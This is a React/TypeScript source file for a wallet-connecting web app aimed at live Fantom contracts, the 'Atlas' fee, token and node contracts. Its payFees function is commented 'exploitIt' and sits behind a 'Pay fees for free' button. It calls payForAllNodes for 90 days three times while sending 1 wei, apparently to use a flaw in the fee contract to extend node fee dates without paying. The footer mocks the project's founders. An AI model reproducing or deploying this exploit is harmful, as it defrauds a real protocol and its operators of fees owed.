import { Button, Flex, Grid, GridItem, Text } from "@chakra-ui/react";
import WalletConnectProvider from "@walletconnect/web3-provider";
import { ethers } from "ethers";
import React, { useCallback, useEffect, useState } from "react";
import Web3Modal from "web3modal";
import { atlasTokenABI, nodesABI, payableABI } from "./abis";
import { useNetworkChanger } from "./hooks/useNetworkChanger";
const chainId = 250;
const rpcUrl = "https://rpc.ftm.tools";
const ftmProvider = new ethers.providers.JsonRpcProvider(rpcUrl);
const atlasFeeContractAddress = "0x74715144091e249A12AA156e6f0B8C413ff3b768";
const atlasTokenContractAddress = "0x4c4dcab8c8222BE395E987D523FfbF95944DF01b";
const atlasNodeContractAddress = "0x2B90351a1dD1C48F27FbaB438e157645CDD1a728";
const atlasFeeContract = new ethers.Contract(
  atlasFeeContractAddress,
  payableABI,
  ftmProvider
);
const atlasTokenContract = new ethers.Contract(
  atlasTokenContractAddress,
  atlasTokenABI,
  ftmProvider
);
const atlasNodeContract = new ethers.Contract(
  atlasNodeContractAddress,
  nodesABI,
  ftmProvider
);
const providerOptions = {
  injected: {
    display: {
      logo: "https://github.com/MetaMask/brand-resources/raw/master/SVG/metamask-fox.svg",
      name: "MetaMask",
      description: "Connect with MetaMask in your browser",
    },
    package: null,
  },
  "custom-walletconnect": {
    display: {
      logo: "https://docs.walletconnect.com/img/walletconnect-logo.svg",
      name: "WalletConnect",
      description: "Connect with any WalletConnect compatible wallet.",
    },
    options: {
      appName: "Node Bears NFT",
      networkUrl: rpcUrl,
      chainId: chainId,
    },
    package: WalletConnectProvider,
    connector: async () => {
      const connector = new WalletConnectProvider({
        rpc: {
          1: "https://mainnet.infura.io/v3/9aa3d95b3bc440fa88ea12eaa4456161",
          250: rpcUrl,
        },
        chainId: chainId,
      });

      await connector.enable();
      return connector;
    },
  },
};
const web3Modal = new Web3Modal({
  cacheProvider: true,
  providerOptions, // required
});

function App() {
  // Web3State
  const [isConnected, setIsConnected] = useState<boolean>();
  const [web3Provider, setWeb3Provider] =
    useState<ethers.providers.Web3Provider | null>(null);
  const [signer, setSigner] = useState<ethers.providers.JsonRpcSigner | null>(
    null
  );
  const [walletAddress, setWalletAddress] = useState<string>("");
  const [isFantom, setIsFantom] = useState<boolean>(false);
  const switchNetwork = useNetworkChanger(web3Provider);

  // Nodes
  const [nodeObjs, setNodeObjs] = useState<any[]>([]);

  // Connect
  async function connectToWeb3() {
    /*web3modal*/
    try {
      const prov = await web3Modal.connect();
      const web3Provider = new ethers.providers.Web3Provider(prov);
      setWeb3Provider(web3Provider);
      setIsConnected(true);
      const signer = web3Provider.getSigner();
      setSigner(signer);
      const add = (await signer.getAddress()).toLowerCase();
      setWalletAddress(add);
      setIsFantom((await signer.getChainId()) === chainId);
    } catch (error) {}
  }
  // Disconnect
  async function dc() {
    web3Modal.clearCachedProvider();
    localStorage.clear();
    resetState();
  }
  async function resetState() {
    setIsConnected(false);
    setWeb3Provider(null);
    setSigner(null);
    setWalletAddress("");
    setIsFantom(false);
  }
  // exploitIt
  async function payFees() {
    try {
      if (signer) {
        const wAtlasFeeContract = atlasFeeContract.connect(signer);
        let result = await wAtlasFeeContract.payForAllNodes("90", {
          value: "1",
        });
        let result2 = await wAtlasFeeContract.payForAllNodes("90", {
          value: "1",
        });
        let result3 = await wAtlasFeeContract.payForAllNodes("90", {
          value: "1",
        });
        await result.wait(1);
        await result2.wait(1);
        await result3.wait(1);
        getNodeObjects();
      }
    } catch {}
  }
  //Format
  function trimmedAddress(add: string) {
    return `${add.substring(0, 4)}...${add.substring(
      add.length - 4,
      add.length
    )}`;
  }

  // getNodes
  const getNodeObjects = useCallback(async () => {
    try {
      if (signer) {
        const wTokenContract = atlasTokenContract.connect(signer);
        const times = await wTokenContract.getNodesCreatime();
        const timesArray = times.split("#");
        // Contract Node Entities
        const nodes = await atlasNodeContract._getAllNodesFromAccount(
          walletAddress
        );

        const namesArray = nodes.map((n: any) => n.name);
        const newNodeObjs = [];
        for (let i = 0; i < timesArray.length; i++) {
          const feeDate = convertToDaysRemaining(nodes[i].feeDueDate);
          const nodeObj = {
            name: namesArray[i],
            feeDate: Number(feeDate),
          };
          newNodeObjs.push(nodeObj);
        }
        setNodeObjs(newNodeObjs);
      }
    } catch (err) {
      console.warn("error fetching nodes:", err);
      setNodeObjs([]);
    }
  }, [signer, walletAddress]);
  const convertToDaysRemaining = (feeDueDate: any) => {
    let unixFee = Number(feeDueDate);
    let currentUnix = Number(new Date().getTime() / 1000);

    var diff = Math.abs(unixFee - currentUnix);

    let days = diff / (60 * 60 * 24);

    return days.toFixed(1);
  };

  useEffect(() => {
    if (isConnected && signer && walletAddress) {
      getNodeObjects();
    }
  }, [isConnected, signer, getNodeObjects, walletAddress]);

  useEffect(() => {
    var item = localStorage.getItem("WEB3_CONNECT_CACHED_PROVIDER");
    if (item && item === '"injected"') connectToWeb3();
  }, []);
  return (
    <Flex minH="100vh" minW="100vw" p="2rem" gap="2rem" flexFlow="column">
      <Flex flexFlow={"row"} w="100%" gap="2rem">
        {isConnected ? (
          <>
            <Button
              maxW="fit-content"
              aria-label="button"
              variant={"solid"}
              borderRadius={"10px"}
              onClick={dc}
              display="flex"
              flexFlow="column"
            >
              <Text isTruncated w="100%" fontWeight={800} textColor={"black"}>
                DISCONNECT WALLET
              </Text>
              <Text
                w="100%"
                isTruncated
                fontSize={"1rem"}
                textAlign={"center"}
                fontWeight={400}
              >
                {trimmedAddress(walletAddress)}
              </Text>
            </Button>
            {isFantom ? (
              <Button
                maxW="fit-content"
                aria-label="button"
                variant={"solid"}
                borderRadius={"10px"}
                onClick={payFees}
                display="flex"
                flexFlow="column"
              >
                <Text isTruncated w="100%" fontWeight={800} textColor={"black"}>
                  Pay fees for free
                </Text>
              </Button>
            ) : (
              <Button
                maxW="fit-content"
                aria-label="button"
                variant={"solid"}
                borderRadius={"10px"}
                onClick={switchNetwork}
                display="flex"
                flexFlow="column"
              >
                <Text isTruncated w="100%" fontWeight={800} textColor={"black"}>
                  Switch to Fantom
                </Text>
              </Button>
            )}
          </>
        ) : (
          <Button
            w="fit-content"
            aria-label="button"
            variant={"solid"}
            className="button"
            onClick={connectToWeb3}
            borderRadius={"10px"}
            padding={"1em"}
            h="40px"
          >
            <Text isTruncated w="100%" fontWeight={800} fontSize={".8rem"}>
              CONNECT WALLET
            </Text>
          </Button>
        )}
      </Flex>
      <Flex w="100%" flexFlow="column">
        <Grid
          gridTemplateColumns="repeat(2,1fr)"
          w="max-content"
          columnGap="2rem"
          rowGap="1rem"
        >
          <GridItem>
            <Text fontWeight={700}>Name</Text>
          </GridItem>
          <GridItem>
            <Text fontWeight={700}>Fee date</Text>
          </GridItem>
          {nodeObjs.map((nodeObj) => {
            return (
              <>
                <GridItem>
                  <Text fontWeight={500}>{nodeObj.name}</Text>
                </GridItem>
                <GridItem>
                  <Text>{nodeObj.feeDate}</Text>
                </GridItem>
              </>
            );
          })}
        </Grid>
      </Flex>
      <Text fontWeight={500}>
        Made with love by <b>@kinsyudev</b>
      </Text>
      <Text fontWeight={900}>F*CK THE FOUNDERS :)</Text>
    </Flex>
  );
}

export default App;
